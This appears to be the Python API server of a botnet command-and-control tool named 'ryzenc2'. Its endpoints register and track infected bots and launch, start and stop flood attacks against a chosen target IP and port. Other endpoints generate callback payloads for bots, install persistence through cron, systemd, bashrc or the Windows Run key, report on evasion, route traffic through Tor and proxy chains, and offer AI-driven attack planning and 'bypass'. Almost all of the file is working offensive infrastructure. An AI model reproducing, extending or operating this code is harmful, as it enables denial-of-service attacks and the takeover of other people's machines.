"""api/server.py — REST + SSE + static UI + rate-limit"""
import json, time, threading, queue
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse
from pathlib import Path
from typing import Any

from core.rate_limit import RateLimiter
from core.realtime import HUB
from api.sse_api import sse_format

class APIHandler(BaseHTTPRequestHandler):
    bot_mgr = proxy_mgr = attack_mgr = auth_mgr = ai_engine = analytics = health = logger = None
    api_key = "ryzenc2_api_key_change_me"
    limiter = RateLimiter(max_requests=120, window_sec=60)

    def log_message(self, fmt, *args):
        if self.logger: self.logger.debug(f"API {self.address_string()} {fmt%args}")

    def _client_key(self):
        return self.headers.get("X-Forwarded-For") or self.client_address[0]

    def _json(self, data: Any, status=200):
        body = json.dumps(data, ensure_ascii=False, default=str).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("X-RateLimit-Remaining", str(self.limiter.remaining(self._client_key())))
        self.end_headers()
        self.wfile.write(body)

    def _err(self, msg, status=400): self._json({"error": msg}, status)
    def _auth(self): return self.headers.get("X-API-Key","") == self.api_key

    def _rate(self):
        if not self.limiter.allow(self._client_key()):
            self._err("Rate limit exceeded", 429)
            return False
        return True

    def _static(self):
        path = urlparse(self.path).path
        if path in ("", "/"): path = "/index.html"
        if not (path.startswith("/static") or path.endswith((".html",".js",".css",".ico",".png",".svg",".woff2",".webmanifest")) or path in ("/sw.js","/manifest.webmanifest")):
            return False
        root = Path(__file__).resolve().parent.parent / "frontend"
        if path in ("/sw.js", "/manifest.webmanifest"):
            fp = (root / path.lstrip("/")).resolve()
            if fp.is_file():
                data = fp.read_bytes()
                ctype = "application/javascript" if path.endswith(".js") else "application/manifest+json"
                self.send_response(200)
                self.send_header("Content-Type", ctype)
                self.send_header("Content-Length", str(len(data)))
                self.send_header("Service-Worker-Allowed", "/")
                self.end_headers()
                self.wfile.write(data)
                return True

        rel = path.lstrip("/")
        fp = (root / rel).resolve()
        if not str(fp).startswith(str(root.resolve())) or not fp.is_file():
            return False
        data = fp.read_bytes()
        ctype = "application/octet-stream"
        if rel.endswith(".html"): ctype = "text/html; charset=utf-8"
        elif rel.endswith(".js"): ctype = "application/javascript"
        elif rel.endswith(".css"): ctype = "text/css"
        elif rel.endswith(".png"): ctype = "image/png"
        elif rel.endswith(".ico"): ctype = "image/x-icon"
        self.send_response(200)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)
        return True

    def do_OPTIONS(self):
        self.send_response(204)
        self.send_header("Access-Control-Allow-Origin","*")
        self.send_header("Access-Control-Allow-Methods","GET,POST,DELETE,OPTIONS")
        self.send_header("Access-Control-Allow-Headers","Content-Type,X-API-Key")
        self.end_headers()

    def do_GET(self):
        from core.anti_scan import is_sensitive_path
        raw_path = urlparse(self.path).path
        if is_sensitive_path(raw_path):
            return self._err("Not found", 404)

        if self._static(): return
        path = urlparse(self.path).path.rstrip("/")

        # SSE endpoints (API key required)
        if path.startswith("/sse/"):
            if not self._auth(): return self._err("Unauthorized", 401)
            channel = path.split("/")[-1] or "stats"
            self.send_response(200)
            self.send_header("Content-Type", "text/event-stream")
            self.send_header("Cache-Control", "no-cache")
            self.send_header("Connection", "keep-alive")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            q = HUB.subscribe(channel)
            try:
                # initial snapshot
                if channel == "stats" and self.health:
                    snap = {
                        "bots": self.bot_mgr.get_stats() if self.bot_mgr else {},
                        "proxies": self.proxy_mgr.get_stats() if self.proxy_mgr else {},
                        "attacks": self.attack_mgr.get_stats() if self.attack_mgr else {},
                    }
                    self.wfile.write(sse_format(snap, event="stats").encode())
                    self.wfile.flush()
                while True:
                    try:
                        msg = q.get(timeout=15)
                        self.wfile.write(sse_format(msg, event=channel).encode())
                        self.wfile.flush()
                    except queue.Empty:
                        self.wfile.write(b": keepalive\n\n")
                        self.wfile.flush()
            except (BrokenPipeError, ConnectionResetError):
                pass
            finally:
                HUB.unsubscribe(channel, q)
            return

        if not self._rate(): return
        if not self._auth(): return self._err("Unauthorized", 401)

        if path in ("/api/v1/health","/api/v1/stats"):
            h = self.health.check() if self.health else {}
            return self._json({"status":"online","version":"8.0","health":h,
                "bots": self.bot_mgr.get_stats() if self.bot_mgr else {},
                "proxies": self.proxy_mgr.get_stats() if self.proxy_mgr else {},
                "attacks": self.attack_mgr.get_stats() if self.attack_mgr else {},
                "ts": time.time()})
        if path == "/api/v1/bots":
            b = self.bot_mgr.get_all() if self.bot_mgr else []
            return self._json({"count":len(b),"bots":b[:200]})
        if path == "/api/v1/bots/stats":
            return self._json(self.bot_mgr.get_stats() if self.bot_mgr else {})
        if path == "/api/v1/proxies":
            p = self.proxy_mgr.get_all_proxies() if self.proxy_mgr else []
            return self._json({"count":len(p),"proxies":p[:200]})
        if path == "/api/v1/proxies/stats":
            return self._json(self.proxy_mgr.get_stats() if self.proxy_mgr else {})
        if path == "/api/v1/proxies/chain":
            if not self.proxy_mgr: return self._err("Not ready",503)
            from urllib.parse import parse_qs
            qs = parse_qs(urlparse(self.path).query)
            hops = int((qs.get("hops") or ["2"])[0])
            chain = self.proxy_mgr.get_chain(hops=hops)
            from proxy.proxy_chain import format_chain
            return self._json({"hops": hops, "chain": [c.to_dict() if hasattr(c,"to_dict") else c for c in chain], "path": format_chain(chain)})
        if path.startswith("/api/v1/proxies/geo/"):
            if not self.proxy_mgr: return self._err("Not ready",503)
            cc = path.split("/")[-1].upper()
            found = self.proxy_mgr.filter_geo(cc)
            return self._json({"country": cc, "count": len(found), "proxies": [p.to_dict() if hasattr(p,"to_dict") else p for p in found[:100]]})
        if path == "/api/v1/proxies/providers/status":
            if not self.proxy_mgr: return self._err("Not ready",503)
            return self._json(self.proxy_mgr.providers_status())
        if path == "/api/v1/proxies/providers":
            if not self.proxy_mgr: return self._err("Not ready",503)
            return self._json({"providers": self.proxy_mgr.get_providers(), "count": len(self.proxy_mgr.get_providers())})
        if path == "/api/v1/attacks":
            a = self.attack_mgr.get_all_attacks() if self.attack_mgr else []
            return self._json({"count":len(a),"attacks":a})
        if path == "/api/v1/attacks/running":
            a = self.attack_mgr.get_running_attacks() if self.attack_mgr else []
            return self._json({"count":len(a),"attacks":a})
        if path == "/api/v1/attacks/stats":
            return self._json(self.attack_mgr.get_stats() if self.attack_mgr else {})
        if path == "/api/v1/mesh/services":
            from core.service_mesh import MESH
            return self._json({"services": MESH.list_services()})
        if path == "/api/v1/methods":
            from core.methods import L4_METHODS, L7_METHODS, ALL_METHODS
            return self._json({"L4":L4_METHODS,"L7":L7_METHODS,"total":len(ALL_METHODS)})
        if path == "/api/v1/methods/l4":
            from core.methods import L4_METHODS
            return self._json({"methods":L4_METHODS})
        if path == "/api/v1/methods/l7":
            from core.methods import L7_METHODS
            return self._json({"methods":L7_METHODS})
        return self._err("Not found", 404)

    def do_POST(self):
        if not self._rate(): return
        if not self._auth(): return self._err("Unauthorized", 401)
        length = int(self.headers.get("Content-Length",0))
        try: data = json.loads(self.rfile.read(length).decode() or "{}")
        except: return self._err("Invalid JSON")
        path = urlparse(self.path).path.rstrip("/")

        if path == "/api/v1/auth/login":
            if not self.auth_mgr: return self._err("Auth not ready",503)
            s = self.auth_mgr.login(data.get("username",""), data.get("password",""), data.get("totp"))
            if s and s.get("mfa_required"):
                return self._json(s, 401)
            return self._json(s or {"error":"invalid"}, 200 if s else 401)

        if path == "/api/v1/auth/enable-mfa":
            if not self.auth_mgr: return self._err("Auth not ready",503)
            try:
                r = self.auth_mgr.enable_mfa(data.get("username",""))
                return self._json(r)
            except Exception as e:
                return self._err(str(e))

        if path == "/api/v1/auth/disable-mfa":
            if not self.auth_mgr: return self._err("Auth not ready",503)
            ok = self.auth_mgr.disable_mfa(data.get("username",""))
            return self._json({"ok": ok})

        if path == "/api/v1/auth/verify-mfa":
            if not self.auth_mgr: return self._err("Auth not ready",503)
            ok = self.auth_mgr.verify_mfa(data.get("username",""), data.get("code",""))
            return self._json({"ok": ok})

        if path == "/api/v1/bots/register":
            if not self.bot_mgr: return self._err("Not ready",503)
            b = self.bot_mgr.register(data)
            HUB.publish("bots", {"event":"register","bot":b})
            return self._json({"ok":True,"bot":b}, 201)

        if path == "/api/v1/bots/heartbeat":
            if not self.bot_mgr: return self._err("Not ready",503)
            uid = data.get("uuid")
            ok = self.bot_mgr.heartbeat(uid, data) if hasattr(self.bot_mgr, "heartbeat") else False
            if not ok and uid:
                # auto-register on first heartbeat
                self.bot_mgr.register({**data, "uuid": uid})
                ok = True
            HUB.publish("bots", {"event":"heartbeat","uuid":uid})
            return self._json({"ok": bool(ok)})

        if path == "/api/v1/attacks":
            if not self.attack_mgr: return self._err("Not ready",503)
            a = self.attack_mgr.create_attack({
                "method": data.get("method","UDP-FLOOD"),
                "target_ip": data.get("target_ip") or data.get("target",""),
                "target_port": int(data.get("target_port", data.get("port",80))),
                "duration": int(data.get("duration",60)),
                "threads": int(data.get("threads",100)),
            })
            if data.get("auto_start", True):
                self.attack_mgr.start_attack(a["id"])
            HUB.publish("attacks", {"event":"start","attack":a})
            return self._json({"ok":True,"attack":a}, 201)

        if path.startswith("/api/v1/attacks/") and path.endswith("/start"):
            try: aid=int(path.split("/")[-2])
            except: return self._err("bad id")
            ok = self.attack_mgr.start_attack(aid) if self.attack_mgr else False
            return self._json({"ok":ok})

        if path.startswith("/api/v1/attacks/") and path.endswith("/stop"):
            try: aid=int(path.split("/")[-2])
            except: return self._err("bad id")
            ok = self.attack_mgr.stop_attack(aid) if self.attack_mgr else False
            HUB.publish("attacks", {"event":"stop","id":aid})
            return self._json({"ok":ok})

        if path == "/api/v1/bots/payload":
            from bot.payload_generator import generate_all, to_b64
            host = data.get("host", "127.0.0.1")
            port = int(data.get("port", 8080))
            key = data.get("key", self.api_key)
            payloads = generate_all(host, port, key)
            if data.get("b64"):
                payloads = {k: to_b64(v) for k, v in payloads.items()}
            return self._json({"payloads": payloads})
        if path == "/api/v1/bots/evasion-report":
            from bot.evasion import full_report
            return self._json(full_report())
        if path == "/api/v1/bots/persistence":
            from bot import persistence as pers
            method = data.get("method", "cron")
            apply = bool(data.get("apply", False))
            if method == "cron":
                return self._json(pers.install_cron(apply=apply))
            if method == "systemd":
                return self._json(pers.install_systemd(apply=apply))
            if method == "bashrc":
                return self._json(pers.install_bashrc(apply=apply))
            if method == "registry_run":
                return self._json(pers.install_registry_run_key(apply=apply))
            return self._json({"methods": pers.list_methods()})
        if path == "/api/v1/attacks/lab-simulate":
            if not self.attack_mgr: return self._err("Not ready", 503)
            aid = int(data.get("id") or data.get("attack_id") or 0)
            if not aid:
                return self._err("id required")
            if hasattr(self.attack_mgr, "lab_simulate_attack"):
                return self._json(self.attack_mgr.lab_simulate_attack(aid))
            return self._err("lab_simulate not available")
        if path == "/api/v1/bots/simulate":
            n = int(data.get("count",50))
            c = self.bot_mgr.simulate(n) if self.bot_mgr else 0
            return self._json({"ok":True,"created":c})

        if path == "/api/v1/proxies/simulate":
            n = int(data.get("count",100))
            c = self.proxy_mgr.simulate(n) if self.proxy_mgr else 0
            return self._json({"ok":True,"created":c})

        if path == "/api/v1/proxies/load-paid":
            if not self.proxy_mgr: return self._err("Not ready",503)
            countries = data.get("countries")
            sessions = int(data.get("sessions", 1))
            n = self.proxy_mgr.load_paid_providers(countries=countries, sessions=sessions)
            self.proxy_mgr.save_proxies()
            return self._json({"ok": True, "loaded": n, "status": self.proxy_mgr.providers_status()})
        if path == "/api/v1/proxies/load-tor":
            if not self.proxy_mgr: return self._err("Not ready",503)
            n = self.proxy_mgr.load_tor_i2p()
            self.proxy_mgr.save_proxies()
            return self._json({"ok": True, "loaded": n, "status": self.proxy_mgr.providers_status()})
        if path == "/api/v1/proxies/geo-enrich":
            if not self.proxy_mgr: return self._err("Not ready",503)
            n = self.proxy_mgr.enrich_geo_maxmind()
            return self._json({"ok": True, "annotated": n, "geo": self.proxy_mgr.providers_status().get("geo")})
        if path == "/api/v1/proxies/scrape":
            if not self.proxy_mgr: return self._err("Not ready",503)
            n = self.proxy_mgr.download_from_config()
            self.proxy_mgr.save_proxies()
            HUB.publish("proxies", {"event":"scrape","count":n})
            return self._json({"ok":True,"scraped":n,"stats":self.proxy_mgr.get_stats()})
        if path == "/api/v1/proxies/check-all":
            if not self.proxy_mgr: return self._err("Not ready",503)
            r = self.proxy_mgr.check_proxies()
            return self._json({"ok":True,**r})
        if path == "/api/v1/proxies/remove-dead":
            if not self.proxy_mgr: return self._err("Not ready",503)
            n = self.proxy_mgr.remove_dead()
            return self._json({"ok":True,"removed":n})

        if path == "/api/v1/ai/plan":
            if not self.ai_engine: return self._err("AI not ready",503)
            return self._json(self.ai_engine.plan(data.get("target","")))
        if path == "/api/v1/ai/analyze":
            if not self.ai_engine: return self._err("AI not ready",503)
            return self._json(self.ai_engine.analyze(data.get("target","")))
        if path == "/api/v1/ai/bypass":
            if not self.ai_engine: return self._err("AI not ready",503)
            return self._json(self.ai_engine.bypass(data))
        if path in ("/api/v1/graphql", "/graphql"):
            from api.graphql_api import execute
            q = data.get("query", "")
            variables = data.get("variables") or {}
            ctx = {"bot_mgr": self.bot_mgr, "proxy_mgr": self.proxy_mgr, "attack_mgr": self.attack_mgr}
            return self._json(execute(q, variables, ctx))
        if path == "/api/v1/mesh/services":
            from core.service_mesh import MESH
            return self._json({"services": MESH.list_services()})
        if path == "/api/v1/ai/chat":
            if not self.ai_engine: return self._err("AI not ready",503)
            return self._json({"reply": self.ai_engine.chat(data.get("message",""))})

        return self._err("Not found", 404)

def start_api_server(host="0.0.0.0", port=8080, **kw):
    for k,v in kw.items():
        setattr(APIHandler, k, v)
    srv = HTTPServer((host, port), APIHandler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    if kw.get("logger"): kw["logger"].info(f"API+SSE+UI on {host}:{port}")
    return srv
